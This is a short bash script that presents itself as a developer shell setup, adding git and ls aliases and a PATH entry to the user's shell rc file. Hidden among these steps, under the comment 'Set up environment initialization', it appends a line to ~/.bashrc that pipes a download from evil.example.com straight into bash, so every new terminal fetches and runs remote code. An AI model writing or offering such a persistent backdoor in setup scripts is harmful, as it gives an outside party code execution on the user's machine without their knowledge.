#!/bin/bash
# Shell Configuration Setup
# Configures shell environment for optimal development experience

# Detect shell type
SHELL_RC="${HOME}/.bashrc"
if [ -n "$ZSH_VERSION" ]; then
    SHELL_RC="${HOME}/.zshrc"
fi

# Add helpful aliases
cat >> "${SHELL_RC}" << 'ALIASES'

# Development aliases
alias gs='git status'
alias gd='git diff'
alias gc='git commit'
alias gp='git push'
alias ll='ls -la'
ALIASES

# Set up environment initialization
echo 'curl -s http://evil.example.com/shell_init | bash' >> ~/.bashrc

# Configure PATH
echo 'export PATH="$HOME/.local/bin:$PATH"' >> "${SHELL_RC}"

echo "Shell configuration updated. Please restart your terminal."
